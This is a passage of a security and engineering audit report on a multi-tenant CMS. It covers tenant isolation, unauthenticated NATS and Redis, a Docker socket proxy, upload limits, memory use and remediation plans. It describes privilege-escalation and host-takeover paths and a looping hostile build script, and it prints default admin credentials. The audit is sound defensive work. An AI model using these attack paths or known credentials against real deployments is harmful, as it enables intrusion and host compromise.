Kestrel's default `MaxRequestBodySize` is 30,000,000 bytes. YARP enforces that server default on proxied requests unless a route sets `MaxRequestBodySize` (YARP 2.3 XML docs: "overrides the server's default (30MB)"). The edge sets neither. The Mode C upload raises the limit only inside admin-api, after the edge has already refused the body. The media upload endpoint does not raise admin-api's own Kestrel limit at all.

**Impact**

Static site bundles of 28.6–100 MB and media files of 28.6–50 MB fail with HTTP 413 instead of the documented limits and friendly errors. This is likely a regression from the Caddy → YARP edge migration (ADR 0010); the upload feature predates it (commit `72a5a79`).

**Verification**

Checked all compose files, appsettings, edge route builder and Kestrel configuration for body-size settings (none), and YARP's bundled XML documentation.

**Recommended Fix**

Set `MaxRequestBodySize` on the `admin-api` route (or a dedicated upload route) to the largest documented limit, and raise Kestrel's limit on the specific admin-api endpoints (`IHttpMaxRequestBodySizeFeature` or `[RequestSizeLimit]`). Add an e2e/integration test uploading a >30 MB file through the edge.

**Related Components**

`StaticSitePage.tsx`, `MediaUploader.tsx`.

### Minor confirmed items (not numbered)

Surfaced and confirmed during the verification pass; too low-impact for a numbered finding but worth fixing:

* **`CertificateProvisioner.EnsureAsync` shares a cancellation token across concurrent handshakes** (`src/Services/Dcms.Edge/Certificates/CertificateProvisioner.cs:32-40`). `inFlight.GetOrAdd(normalized, key => RunAsync(key, ct))` captures the first caller's `ct`; a second TLS handshake for the same SNI awaits that task, so if the first client disconnects, issuance is cancelled for both. Self-heals on the next handshake. Fix: use a linked/independent token for the shared issuance.
* **Visitor `/api/{slug}/register` NREs on an empty JSON body** (`src/Services/Dcms.ContentApi/Visitors/VisitorAuthEndpoints.cs:23-35`). `body.Email.Trim()` throws on `{}` → 500 instead of 400. There is also no visitor password-length policy (only non-empty), unlike the 10-char minimum for platform accounts. Fix: null-guard the body and add a minimum length.

## 4. Missing / Incomplete Features

## [MISS-01] A workspace member cannot be removed; only their roles can

**Severity:** MEDIUM

**Category:** Missing feature (access lifecycle)

**Confidence:** HIGH

**Status:** VERIFIED (API and UI)

**Location:**

* `src/Services/Dcms.AdminApi/Tenancy/TenancyEndpoints.cs:295-379` (members: list, grant role, revoke role; no delete)
* `apps/admin/src/features/members/MembersPage.tsx:57-148` (UI offers only role add/remove and invitations)
* `src/Services/Dcms.AdminApi/Tenancy/MyAccountEndpoints.cs:60-133` (only self-removal, by deleting one's own account)

**Summary**

No admin endpoint or UI deletes a `tenancy.tenant_memberships` row. Removing all roles leaves the person a **member**. `TenantMembershipMiddleware` then admits them to every bare-`RequireAuthorization()` admin endpoint, including:
* `/api/admin/openapi.json` (the tenant's full content API description)
* `/api/admin/api-client.zip`, `/api/admin/site-starter.zip`
* `/api/admin/plugins/catalog`, `/api/admin/permissions/catalog`
* notifications and navigation.

The only exit is the member deleting their own account. Invitations are refused for existing members ("already a member").

**Impact**

Off-boarding a person from a workspace is impossible for tenant admins. Former staff keep a membership and low-sensitivity read access, and appear in member lists indefinitely.

**Verification**

Enumerated all admin-api routes (REPOSITORY_MAP §5.1) and searched for `Memberships.Remove`/`ExecuteDelete` (only in the self-delete path). Checked the Members UI.

**Recommended Fix**

Add `DELETE /api/admin/members/{membershipId}` (`members:manage`, subject to the SEC-06 rules: not the last Owner), invalidating the permission cache, reconciling Forgejo collaborators and publishing `membership.changed`.

**Related Components**

SEC-06, `RepoAccessReconciler`.

## 5. Backend Architecture

### [ARCH-01] RLS is not forced; EF query filters are the only runtime tenant guard (INFORMATIONAL)

Documented in ADR 0005 and accepted. The app connects to Postgres as the table owner, which bypasses Row-Level Security, so the `tenant_isolation` policies protect only the non-owner `dcms_rls` role used by the isolation test. Tenant isolation at runtime rests entirely on EF Core global query filters (`CurrentTenantId => tenantContext.TenantId ?? Guid.Empty`).

Observations from this audit that make the design **acceptable but fragile**:
* The null-tenant fallback (`Guid.Empty`) is fail-safe: no tenant table row uses `Guid.Empty`, so an unresolved tenant yields an empty result rather than a leak.
* The filters are applied consistently on every tenant entity across the 10+ DbContexts reviewed.
* `IgnoreQueryFilters()` is used 125 times, and **both subsets were swept** in the verification passes. Request-handlers/hubs: all safe (capability tokens, self-scoped ids, HMAC-verified webhook, globally-unique hostname) **except the site-preview proxy (SEC-14)**. Workers/consumers (cross-tenant by design): every one re-scopes by an explicit `TenantId` taken from the event or parent entity; none returns another tenant's data to a caller. The only way to influence their tenant input is INF-01 (unauthenticated NATS). No cross-tenant IDOR found in either subset.

The risk: one forgotten filter, one `IgnoreQueryFilters()` without a re-scope, or one DbContext registered without `ITenantContext`, becomes silent cross-tenant access with no backstop. `RlsConfigurator.AssertCoverage` (run in the migrate job) protects the RLS *list*, not the query filters.

**Recommendation:** move toward forced RLS with a per-connection `app.tenant_id` GUC (the policies are already shaped for it, per ADR 0005), running the app under a `NOBYPASSRLS` role, with the documented cross-tenant paths setting the GUC explicitly. This turns a forgotten filter from a breach into an empty result.

### General assessment

The backend is a clean, consistently-applied **vertical-slice Minimal API** system with a well-thought-out shared-library layer. Dependency direction is correct (leaves: Kernel/Contracts; services depend inward on shared libs; no shared lib depends on a service). Notable strengths:
* A real audit subsystem (transactional outbox + HMAC hash chain) with a coverage test that fails the build for any un-audited mutating endpoint.
* A permission-coverage test that fails the build for any un-gated mutating endpoint.
* Startup guards that fail closed in Production (visitor key, identity certs, weak webhook/alert secrets, missing Postgres credential).
* Least-privilege DB roles for edge, site-builder, platform-api and Grafana, and least-privilege service env in compose (site-builder/email-worker opt out of the credential anchor).

Maintainability concerns (not defects): large endpoint files (`SiteEndpoints.cs` 1,292 lines), duplicated permission constants and scope lists that must be hand-synced (FE↔BE, seeder↔server), and the two hand-maintained lists in `TenancyMigrator`/`RlsConfigurator`.

## 6. React Architecture

Both SPAs are modern React 19 + Vite + TanStack Router/Query + Zustand, with a shared `@dcms/core` (auth, fetch client, runtime config) and `@dcms/ui` design system. Typecheck is clean and 1,702 vitest tests pass.

Findings and observations:
* **SEC-10 (HIGH):** the IDE preview iframe uses `allow-scripts allow-same-origin`, collapsing the sandbox — the dominant frontend risk.
* **Token storage:** OIDC access + refresh tokens live in `localStorage` (`packages/core/src/auth.ts`), which maximises the blast radius of any XSS (SEC-10/-12/-13). A BFF or in-memory + silent-renew pattern would reduce this.
* **`dangerouslySetInnerHTML`:** three uses. Two in the builder BlocksPanel render internal, developer-authored thumbnail SVG (safe). One in the site template renders tenant rich-text (SEC-13). The GrapesJS canvas sets `allowScripts: false` (good).
* **UI permission gating is cosmetic** and correctly treated as such (server enforces); `RequirePermission` mirrors backend keys but they are hand-synced.
* **Lint:** 24 warnings, no errors — mostly `react-hooks/exhaustive-deps` and `jsx-a11y/no-autofocus`. A few `exhaustive-deps` warnings (e.g. `ContentPage.tsx:105`, `MonacoEditor.tsx:112`) are worth checking for stale-closure/effect-cleanup bugs but none were confirmed as defects in this pass.
* Data fetching uses TanStack Query with sane defaults (`retry: 1`, no refetch-on-focus). A deeper verification pass over the largest features (`ide/agent`, `assistant`, `ide/preview`, `site-source` live-updates, `MonacoEditor`, `IdePage`) found **disciplined async and lifecycle handling** — AbortController cancellation, `cancelled`/`disposed` guards, stale-response-id checks, and cleanup that stops SignalR connections and disposes Monaco models/subscriptions. No memory leaks, stale-closure bugs or effect races were found.

## 7. Backend ↔ Frontend Contract

* No shared/generated contract between backend DTOs and frontend types; each `features/*/api.ts` hand-declares interfaces. Drift is possible everywhere and only e2e mocks and integration tests pin shapes. The one generated contract is the **tenant-site** client (`TypeScriptClientEmitter`), which is a different surface.
* Endpoints with no frontend consumer (candidate dead/vestigial, from REPOSITORY_MAP §7.9, re-confirmed by grep): `PUT /api/admin/sites/{id}/definition`, `POST /git/provision`, `POST /api/platform/purge/prometheus`, `GET /api/admin/ai/ping`. These are not bugs but should be pruned or wired.
* The admin SPA calls the API relative to `/api`; behind the edge this reaches admin-api. The `apps/admin/nginx.conf` also proxies `/api/` to `admin-api:8080`, which is a dev-compose convenience — in the deployed topology the edge routes `/api`, so the nginx proxy is unused there (harmless but worth noting).
* Permission constants and OAuth scope lists are duplicated across the boundary and hand-synced (see ARCH-01).

## 8. Database / Persistence

* **One Postgres 18 database, schema-per-context**, EF Core migrations per context, applied by a one-shot `admin-api --migrate-only` job (plus `identity-migrate`). Advisory locks serialise migrate/seed. This is sound.
* **Tenant isolation:** see ARCH-01. Query filters are the guard; RLS is an unforced backstop.
* **Raw SQL:** all reviewed raw SQL is parameterised (`ObservabilityQuery` uses `DbParameter`; `ContentListQueries`/`TagQueries` comments state inputs are bound; the identity membership count and worker claim queries use `{0}` parameters). Identifier interpolation in DDL helpers (`RlsConfigurator`, `AuditSchemaConfigurator`, `PlatformRoleConfigurator`) uses compile-time constants, not user input. **No SQL injection found.**
* **PERF-01 (MEDIUM):** `MinioObjectStorage.GetAsync` buffers whole objects — this is a storage-layer, not a query, issue.
* **Transactions:** the role-PUT swap uses an explicit transaction (`ExecuteDelete` + insert) to avoid the EF re-add concurrency bug (documented). Outbox drains use `FOR UPDATE SKIP LOCKED`-style claims (worth confirming in a deep pass).
* **Cascades:** `MemberRole` rows are deleted explicitly before their parent (no DB cascade). `TenantDeleter`/`SiteDeleter`/`MyAccountEndpoints` cascade across schemas, MinIO and Forgejo in application code — reviewed in the verification pass and found **incomplete (BUG-04)**: AI transcripts, the social schema and notifications are not swept.
* No N+1 was confirmed, but several endpoints loop `ReconcileUserAsync` per affected member (each doing a Forgejo HTTP call); acceptable for small member counts, a latency risk for large ones.

## 9. Background Jobs / Async Processing

* ~30 hosted services / consumers. JetStream consumers use explicit ack, `MaxDeliver` caps, and (for site-builder) an `AckHeartbeat` to extend the lease for long builds — a well-reasoned fix to a documented redelivery storm.
* **Idempotency:** notification consumers use dedupe keys; email uses a dedupe key and permanent-vs-transient classification with backoff and terminate. Good.
* **REL-01 (MEDIUM):** the Mode B build's sandbox container is orphaned on timeout/shutdown.
* **BUG-01/BUG-03 (MEDIUM/LOW):** publish coalescing drops the latest push; activation is last-finisher-wins.
* **Cancellation/shutdown:** consumers break cleanly on `stoppingToken`; the build path's host-shutdown case leaves a container (REL-01).
* Several consumers are ordered/ephemeral (`SiteCacheInvalidator`, `TenantStatusInvalidator`) — correct for cache invalidation (each replica must act). The memory note that most consumers are still serial is a throughput, not correctness, concern.

## 10. Tests

* **Volume:** ~440 .NET tests (unit + plugin + integration) and 1,702 frontend vitest tests, all passing locally. Integration tests use Testcontainers and self-skip without Docker; the full suite OOMs on the dev box (documented) so must be filtered.
* **Strong guardrail tests:** `PermissionCoverageTests` (every mutating endpoint must declare a permission or an exemption) and `AuditCoverageTests` (every mutating endpoint must audit or exempt). These fail the build and are genuinely valuable.
* **RLS/tenancy:** `RlsIsolationTests` proves the policy under `dcms_rls`; `TenancyIsolationTests` proves cross-tenant reads are Forbidden for a few endpoints and that the permission cache invalidates on role change.
* **Coverage gaps that map directly to findings:**
  * No test that a **locked** user cannot refresh a token (SEC-05).
  * No test for **privilege escalation** via role/member grants (SEC-06) — `PermissionCoverageTests` checks *that* a permission is required, not *which*.
  * No hub authorization tests (SEC-08/-09); the chat integration test is a single happy-path case.
  * No test for the SVG sanitization window (SEC-12) or upload size through the edge (BUG-02).
  * Frontend e2e (Playwright) is mock-only and **not run in CI**; frontend unit tests, lint and e2e are all absent from `.gitlab-ci.yml`.
* **CI gap:** the `frontend` CI job runs `pnpm -r build` only. `pnpm test`, `pnpm lint`, `pnpm e2e` never run in CI.

## 11. Dependencies

### [DEP-01] High-severity transitive npm advisories (MEDIUM)

`pnpm audit` reports **37 advisories (21 high, 13 moderate, 3 low, 0 critical)**, all transitive:
* Concentrated under `@scalar/api-reference-react` (the OpenAPI viewer in the admin API-docs page): `nanoid`, `postcss`, `shell-quote`, `ts-deepmerge`, `unhead`, `yaml`, `@vue/*`. Mostly DoS/ReDoS and a Vue-side XSS in `unhead` (the admin uses the React build, so the Vue XSS is likely not reachable, but the DoS ones run in the admin bundle).
* `@rjsf/validator-ajv8 > ajv > fast-uri`: several high SSRF/host-confusion advisories in a URI parser used for JSON-Schema `format` validation of plugin config.
* `react-router@7.13.0` in `packages/site-template-react`: multiple high advisories (turbo-stream RCE, XSS, DoS). This ships into **tenant sites**, so it is the most consequential — a tenant site built today embeds a vulnerable router.
* Vite/babel/vitest toolchain advisories are dev-only.

**.NET:** `dotnet list package --vulnerable` reports **no** vulnerable packages across all 48 projects. The `Directory.Packages.props` security pins (SSH.NET 2026.0.0, System.Security.Cryptography.Xml 10.0.11) are doing their job. `--deprecated` is empty. Many minor/patch updates are available; notable majors deferred by choice (ImageSharp 4 is licence-gated per ADR 0001).

**Recommendation:** bump `react-router` in `site-template-react` (highest impact — reaches tenants), update `@scalar/api-reference-react` and `@rjsf/validator-ajv8`, and add `pnpm audit --prod` to CI as a non-blocking report.

## 12. Configuration / CI/CD / Infrastructure

## [INF-01] Flat container network with unauthenticated NATS and Redis and a write-enabled Docker API proxy

**Severity:** MEDIUM

**Category:** Configuration / Infrastructure (defense in depth)

**Confidence:** HIGH

**Status:** VERIFIED (configuration)

**Location:**

* `docker-compose.yml`, `docker-compose.prod.yml`, `docker-compose.vps.yml` — no `networks:` segmentation. The only `networks:` key is an alias for identity at `docker-compose.yml:262`.
* `infra/nats/nats.conf` — `no_auth_user: app`. `docker-compose.vps.yml:326-331` loads it. Services connect with `Nats__Url: "nats://nats:4222"` and no credentials (`docker-compose.prod.yml:29`).
* `docker-compose.yml:86-97`, `docker-compose.prod.yml:28` — Redis with no `requirepass`/ACL. Clients use `ConnectionStrings__Redis: "redis:6379"`.
* `docker-compose.prod.yml:324-339` — `docker-socket-proxy`: `privileged: true`, `CONTAINERS=1 IMAGES=1 NETWORKS=1 POST=1`.

**Summary**

Every container shares one network. That includes the internet-facing ones (edge, content-api, site-host), the ones that make tenant-directed outbound calls (ai-gateway, admin-api's Meta mirror), and the ones that process tenant uploads (media-worker, site-builder). From that network, three control planes accept unauthenticated clients:
1. **NATS JetStream:** `no_auth_user` maps credential-less connections to the full-permission `app` user, so the configured password is not required. Anyone can publish `site.publish.requested.*`, `email.send`, `audit.submitted`, `notify.raise`, `tenant.suspended`, … Consumers trust payload fields such as tenant id and site facts.
2. **Redis:** holds the authorization cache `perm:{tenantId}:{userId}` (`TenancyPermissionResolver.cs:13-40`), which `PermissionAuthorizationHandler` trusts for 5 minutes, plus ACME challenge responses and published-content caches.
3. **Docker Engine API proxy** with create/start/stop permissions. The site-builder needs this, but no network isolates it from other services.

**Impact**

Any single foothold becomes platform-wide:
* A compromised container, or an SSRF that can speak the protocol, can grant itself arbitrary tenant permissions by writing `perm:*` keys.
* It can forge audit records, send email from the platform relay, or queue builds for any tenant.
* Through the Docker proxy it can create and start a container (host takeover). **Confirmed against the image's ruleset:** `CONTAINERS=1 POST=1` opens the entire `/containers` namespace to POST, so `/containers/create` + `/{id}/start` (with `IMAGES=1` allowing the pull) are permitted — a container mounting the host filesystem or `--privileged` is root on the host.

SEC-01 shows a concrete SSRF already reaching this network.

**Verification**

Read all compose files, `nats.conf`, `TenancyPermissionResolver`, `PermissionAuthorizationHandler`, the socket-proxy definitions and consumer code (`SitePublishConsumer`, `AuditIngestConsumer`, `EmailSendConsumer` accept any well-formed message).

**Recommended Fix**

* Remove `no_auth_user`. Give each service its own NATS user with publish/subscribe permissions limited to its subjects, delivered via Vault.
* Enable Redis ACLs (per-service users, key patterns), or at least `requirepass`.
* Put `docker-socket-proxy` on an internal network shared only with site-builder, and prefer the granular `ALLOW_STOP`/`ALLOW_START` flags with `CONTAINERS=0` over the blanket `CONTAINERS=1` (which, as the extracted ruleset shows, opens `/containers/create`); drop `NETWORKS`/`IMAGES`.
* Split the compose network into tiers: public (edge ↔ SPAs, site-host, identity, APIs), data (APIs ↔ Postgres/Redis/NATS/MinIO/Vault), observability, build.

**Related Components**

SEC-01, SEC-04, all JetStream consumers.

### Other configuration observations

* **Dev-default secrets without a Production guard.** `IdentitySeeder` falls back to `Admin!23456` (SuperAdmin), `dcms-admin-api-dev-secret` and `dcms-platform-api-dev-secret` when config is absent. Unlike the visitor key / identity certs / webhook / alert secrets — which have explicit Production refusals — these seeded secrets have none; `infra/vault/apply.sh` does not auto-generate `Identity__AdminApiService__Secret` or the SuperAdmin password (they are human-entered), so a host provisioned without setting them boots with known credentials. **Recommendation:** add a Production startup guard mirroring the others. (LOW; not written up as a numbered finding because exploitability depends on the operator skipping documented steps, but it fits the platform's own "fail closed" pattern.)
* **Floating `:latest` tags** for Vault, MinIO, mc, nats-box, mailpit, the socket proxies and the build sandbox image. A supply-chain or reproducibility risk; the app images are correctly pinned by digest via CI.
* **CI/CD (`.gitlab-ci.yml`)** is well-structured (build → test → images → promote → deploy), builds by SHA, promotes to `v*` tags, and rolls by digest. Gaps: no frontend test/lint/e2e (see §10), no dependency-audit gate, `deploy:dev` runs on every default-branch push (matches the documented workflow).
* **Secrets management** is a genuine strength: Vault KV per service, Transit for tenant/social/TLS keys, AppRole per service, Transit auto-unseal, and a sidecar (log-janitor) that reads its own secret from Vault rather than env. `.env.example` drift (missing platform-api/edge/log-janitor AppRole vars) is a documentation nit.
* **Forgejo** hardening in prod is reasonable (`DISABLE_REGISTRATION`, `webhook ALLOWED_HOST_LIST: private,loopback`, reverse-proxy auth for API disabled). `REVERSE_PROXY_TRUSTED_PROXIES: 172.16.0.0/12` trusts the whole compose network (see SEC-04 for the analogous Grafana issue).

## 13. Performance

## [PERF-01] Anonymous delivery paths buffer whole objects in memory on every request

**Severity:** MEDIUM

**Category:** Performance / Availability

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/Shared/Dcms.Shared.Storage/MinioObjectStorage.cs:17-27` (`GetAsync` copies the object into a `MemoryStream`)
* `src/Services/Dcms.SiteHost/SiteHostEndpoints.cs:95-108` (copies that stream again into a `byte[]`, then `Results.Bytes`)
* `src/Services/Dcms.ContentApi/Delivery/MediaDeliveryEndpoints.cs:48-58, 80-92` (`/api/media/{assetId}/original` and HLS files, anonymous)
* `docker-compose.yml` — no `mem_limit` on content-api, site-host or admin-api

**Summary**

`IObjectStorage.GetAsync` materialises the entire object before returning a "stream". site-host then duplicates it, so every tenant-site asset request holds 2× the file size in managed memory. content-api serves media originals (up to the 50 MB ingest limit) and site assets (up to 50 MB per file) the same way, to anonymous callers. `enableRangeProcessing: true` does not help: each HTTP Range request (video seeking) still downloads and buffers the whole original first.

**Impact**

Memory use scales with request concurrency × file size on a 7.6 GB single host where these services have no memory limit. The edge allows 1,200 requests/minute per IP, so a single client can drive content-api or site-host into large LOH allocations, GC pressure and, at worst, host-level memory exhaustion affecting every service. Normal traffic to video originals or large site assets also costs a full download per range request.

**Attack / Failure Scenario**

A tenant site embeds a 45 MB video original. A client issues 60 parallel range requests for it. content-api allocates ~2.7 GB transiently. Repeated, this starves co-located Postgres and Vault.

**Verification**

Read `MinioObjectStorage`, both delivery endpoints and all `GetAsync` callers; checked compose memory limits.

**Recommended Fix**

Add a true streaming read (`GetObjectAsync` with a callback that writes directly to the response, or a presigned-URL redirect to MinIO, or `StatObject` + ranged `GetObject` offsets). Stream from site-host without the extra `ToArray`. Set `mem_limit` on public services so a spike is contained to one container.

**Related Components**

`AdminApi/Media/MediaEndpoints.cs:381`, `SitePublishConsumer.ExtractStaticBundleAsync`, `MediaWorker` consumers.

## 14. Observability / Reliability

## [REL-01] A timed-out or cancelled Mode B build leaves its sandbox container running

**Severity:** MEDIUM

**Category:** Reliability / Resource management

**Confidence:** HIGH

**Status:** VERIFIED (code)

**Location:**

* `src/Services/Dcms.SiteBuilder/ReactAppBuilder.cs:413-426` (timeout path kills the local process tree)
* `src/Services/Dcms.SiteBuilder/SandboxOptions.cs:91-104` (`docker run --rm --init …` with no `--name`, label or `--stop-timeout`)
* `src/Services/Dcms.SiteBuilder/ReactAppBuilder.cs:405-417` (host cancellation path)

**Summary**

In sandbox mode the child process is the `docker` CLI, not the build. On timeout the builder calls `process.Kill(entireProcessTree: true)`, which SIGKILLs the CLI. A SIGKILLed client does not stop the container it attached to, so the build keeps running with its 2 CPU / 2 GB allowance. The container has no name or label, so nothing can find and remove it later. On host shutdown (`ct` cancelled) the `when` filter is false, the exception propagates, and the process is disposed without being killed at all.

**Impact**

A build that hangs, whether malicious (`while(true)` in `vite.config`) or accidental, keeps consuming half of the 4-core host after the platform has recorded it as failed. Each retry adds another container, so repeated publishes can starve the host. That matches the operational history noted in `CLAUDE.md` ("a runaway build cannot be killed without a reboot").

**Attack / Failure Scenario**

A tenant publishes a site whose build script is `node -e "for(;;){}"`. After 8 minutes the job fails and the next lane job starts, while the first container still burns 2 CPUs. Five publishes saturate the host.

**Verification**

Read the process handling and docker argv; searched `Dcms.SiteBuilder` for `kill`, `stop`, `rm`, `--name`, `label` (none).

**Recommended Fix**

Give each container a deterministic `--name dcms-build-<buildId>` and label. On timeout or cancellation, run `docker kill`/`docker rm -f` by name, through the proxy. Use `docker run --stop-timeout`. Add a startup sweep that removes stale labelled build containers.

**Related Components**

`SitePublishConsumer`, `docker-socket-proxy`, SEC-02.

### Observability strengths and gaps

Strengths: full OpenTelemetry pipeline (OTLP → Alloy → Prometheus/Loki/Tempo), a `ready`-vs-`live` health-check split that is genuinely load-bearing (the edge's readiness includes route-table population; the store checks fail readiness without triggering a restart), traceparent propagation carried across the outbox→JetStream→build chain, and audit records that share a TraceId with the traces. The team has clearly invested here (three ADRs, a telemetry TODO log, obs-smoke scripts).

Reviewed and found sound in the verification pass:
* **Audit hash chain** (`AuditChainAppender`/`AuditCanonicalizer`/`AuditChainKeyProvider`/`AuditChainSealer`/`AuditChainVerifier`): HMAC-SHA256 over a **length-prefixed** canonical serialization (prevents field-boundary/concatenation ambiguity), chained per (tenant, month) with the head row locked `FOR UPDATE`, idempotent on (OccurredAt, EventId). The key is ≥32 bytes from Vault, refused at startup outside Development, and lives outside the database, so a DB-only compromise cannot forge valid hashes. The verifier detects sequence gaps, prev-hash breaks and per-row hash tampering; completed months are HMAC-**anchored** (row count + boundary hashes), giving deletion/truncation resistance for sealed periods. The only residual is tail-truncation of the *current* unsealed month — the standard append-only-chain limitation — mitigated by the purge-protected external audit-log stream (`TargetsProtectedStream` refuses to delete it) and monthly sealing. Robust, no finding.
* **Edge certificate issuance**: the dangerous "accept any server cert" ACME path is double-gated (`AcceptInsecureAcmeDirectory`) and hard-refused for `letsencrypt.org`; DNS-01 is used only for the platform's own wildcard identifiers and publishes TXT records only in Cloudflare zones the account controls; `ManagedCertificateGuard` enforces the Let's Encrypt 5/week and 5/hour budgets with backoff. Managed-cert endpoints are console/SuperAdmin-gated, so a tenant cannot request a platform wildcard.

Gaps found:
* **REL-01** — orphaned build containers evade the `SiteBuild` failure record.
* The in-process rate limiters (edge and content-api) are honest about being `PermitLimit × replicas` and are documented as approximate; combined with INF-01 they are not a hard DoS control.
* content-api's rate limiter exempts `/hub`, and the edge exempts WebSockets — SEC-09's abuse path rides exactly that exemption.

## 15. Documentation

The documentation is unusually thorough and, where checked, accurate:
* `REPOSITORY_MAP.md` (this audit's baseline) matched the code on every spot-check.
* 13 ADRs, `docs/setup.md`, `docs/runbook.md` (1,353 lines), `docs/vault-secrets.md`, `CLAUDE.md` and per-area TODO logs. Code comments are exceptionally detailed and explain *why*, including past incidents.

Discrepancies found:
* **`CLAUDE.md` is stale on RLS coverage.** It says the startup log's "applied to N tenant tables" proves nothing and implies nothing checks coverage. In fact `RlsConfigurator.AssertCoverage` (run in the migrate job) is a model-based check that fails the deploy if a `TenantId` table is missing from the list. The *value* of the guard is understated. (Noted in REPOSITORY_MAP too.)
* **Documented trust boundaries that the code does not enforce:** site-host `/internal/*` is described as "not routed from any public host" but is reachable through the edge catch-all (SEC-03).
* **`docs/runbook.md` / `docs/deploy-linux.md`** print the dev SuperAdmin credentials `admin@dcms.local` / `Admin!23456`; ensure the production runbook forces a change (ties to the §12 dev-default-secret note).
* `.env.example` omits AppRole variables for platform-api, edge and log-janitor though `infra/vault/services.sh` provisions them.

## Recommended Action Plan

### Immediate (security / correctness — address before or alongside the next release)

1. **SEC-01** — Remove tenant-supplied base URLs for "local" AI providers on the shared platform, and add a connect-time SSRF guard in ai-gateway. Segment the network so ai-gateway cannot reach Prometheus/Loki/the Docker proxy (INF-01).
2. **SEC-05** — Make account lock / password change actually revoke: check lockout on the refresh-token grant, rotate the security stamp, revoke OpenIddict tokens, and lock the Forgejo mirror.
3. **SEC-06** — Enforce "no grant beyond your own permissions", protect the Owner role and the last Owner, and validate permission strings.
4. **SEC-10** — Drop `allow-same-origin` from the IDE preview iframe (the bridge already uses `postMessage`); ideally serve previews from a separate cookieless origin. Add a CSP to the admin SPA (SEC-11).
5. **INF-01** — Turn on NATS per-service auth and Redis ACLs; isolate the Docker socket proxy and split the compose network into tiers.
6. **SEC-12** — Sanitize SVGs synchronously on upload (or gate delivery on `Status == Ready`) and serve user SVGs with an isolating CSP/attachment disposition.
7. **SEC-08 / SEC-09** — Gate the chat hub on real permissions and throttle anonymous chat + its AI calls.
8. **SEC-14** — Require `site:edit` and membership in the *site's* tenant on the preview proxy; add anonymous/foreign-tenant refusal tests.

### Short Term (important engineering improvements)

9. **BUG-01 / BUG-03 / REL-01** — Fix publish coalescing (latest-wins), activation ordering, and orphaned build-container cleanup.
10. **BUG-04** — Complete `TenantDeleter` (AI transcripts, social, notifications); add a test asserting every `RlsConfigurator.TenantTables` entry is purged.
11. **MISS-01** — Add member removal.
12. **DEP-01** — Bump `react-router` in `site-template-react` (reaches tenants), update Scalar and rjsf/ajv; add a dependency-audit report to CI.
13. **PERF-01** — Stream object storage instead of buffering; add `mem_limit` to public services.
14. **Testing/CI** — Run frontend tests, lint and e2e in CI; add tests for locked-user refresh (SEC-05), privilege escalation (SEC-06) and hub authorization (SEC-08).
15. **SEC-02 / SEC-07 / SEC-11 / BUG-02** — Disable pnpmfile/yarn-path in Mode B installs; add antiforgery + framing headers to identity pages and the consoles; fix upload size limits at the edge.

### Long Term (architecture / technical debt)

16. **ARCH-01** — Move toward forced Postgres RLS with a per-connection tenant GUC so a forgotten query filter fails safe; complete the byte-level IDOR sweep of the remaining worker `IgnoreQueryFilters()` sites first.
17. Replace `localStorage` OIDC token storage with a BFF or in-memory + silent-renew pattern.
18. Reduce hand-synced duplication (permission constants FE↔BE, OAuth scope lists seeder↔server, RLS/migrator lists) with a single generated source of truth; likewise generate frontend types from backend contracts.
19. Pin infrastructure images by digest.

## Positive Findings

The repository is, overall, **well-engineered and security-conscious** — considerably more so than typical for a system of this breadth:

* **Audit subsystem:** transactional-outbox + HMAC hash chain, monthly sealing, gap detection, and a build-failing coverage test that forces every mutating endpoint to audit or explicitly exempt itself.
* **Authorization coverage test:** a build-failing test that forces every mutating endpoint to declare a permission or an exemption.
* **Fail-closed startup guards** in Production: visitor signing key, identity signing/encryption certificates, weak webhook/alert secrets, and a missing Postgres credential all refuse to boot with a clear message.
* **Least privilege throughout:** scoped Postgres roles (edge, site-builder, platform-api, Grafana, dcms_rls), scoped MinIO accounts, per-service Vault AppRoles, and services that deliberately opt out of the shared credential env.
* **Defense-in-depth RLS** (even if not forced), a genuinely robust SVG sanitizer, no-shell process execution (`ArgumentList`), constant-time secret comparisons (webhook, log-janitor), and parameterised SQL everywhere.
* **Clean build:** `dotnet build` with `TreatWarningsAsErrors` passes with zero warnings; no vulnerable NuGet packages; 1,702 frontend tests and ~440 backend tests pass.
* **Exceptional documentation and code comments** that explain the reasoning and cite past incidents.
* The Mode B build sandbox, while improvable (SEC-02, REL-01), is already hardened (`--read-only`, `--cap-drop ALL`, `no-new-privileges`, `--network none` for the build phase, pids/mem/cpu limits, optional gVisor).

## Audit Coverage

**Reviewed deeply (traced flows, read implementations):**
* Edge: routing, header scrubbing, identity-header injection, cookie/OIDC auth, rate limiting, output cache, HTTPS/HSTS, certificate store/provisioner/TLS-SNI/allow-list.
* site-host (all files), site-builder (all files + sandbox), the full site publish/build/activate/webhook pipeline in admin-api.
* ai-gateway (messages/quota/provider resolution) and the admin-api AI proxy + settings.
* Identity: account pages, account API, OIDC authorize/token/userinfo, platform-user admin, seeder.
* admin-api Tenancy: membership middleware, service-principal guard, console caller, permission resolver, roles/members/invitations/tenant-admin/my-account, RepoAccessReconciler, git merge (process exec).
* content-api: visitor auth/token, chat hub + bot, forms, media delivery.
* platform-api: delegation proxy, purge endpoints + Loki/Prometheus guards, observability SQL.
* Shared: Security (authn/authz), Storage, Media (SVG/sniffer), Vault (transit/token refresh), Hosting (rate limit/headers/health), tenancy DbContext filters + RLS configurator/init SQL.
* Frontend: `@dcms/core` auth/http, IDE preview, SPA nginx/Dockerfile, GrapesJS canvas config.

**Reviewed at standard/surface depth (read key parts, not exhaustive):** admin-api Cms/Analytics/Notifications/Audit(chain internals)/ApiClientGen(emitter)/Social(beyond OAuth callback), content-api Delivery/Search/Branding/OpenApi/Story, media-worker transcoders, the 19 plugins, `packages/gjs-*`, `packages/ui`, `apps/platform` features, most `apps/admin` feature pages (assistant/agent/builder/site-source internals).

**Tools/builds/analysis executed:** `dotnet build` (clean), `dotnet list package --vulnerable/--outdated/--deprecated`, `pnpm audit`, `pnpm lint`, `tsc -b --noEmit` (both SPAs), full `pnpm -r test` (1,702 tests). Integration tests were **not** executed (documented OOM on this box); no live stack was run.

**Reviewed in verification passes (previously listed as uncertain):**
* All 125 `IgnoreQueryFilters()` sites (both request-handler and worker subsets) → only SEC-14.
* Audit hash-chain crypto (appender, canonicalizer, key provider) → sound, no finding.
* Edge certificate issuance (ACME insecure-directory guard, Cloudflare DNS-01 zone-walk, managed-cert rate-limit budget) → sound, no finding.
* `hydrate.js` HTML sinks → the `html:` binding target is the SEC-13 delivery-side vector; no new finding.
* TypeScript client emitter escaping → sound, no finding.
* Tenant deletion cascade → incomplete → BUG-04.

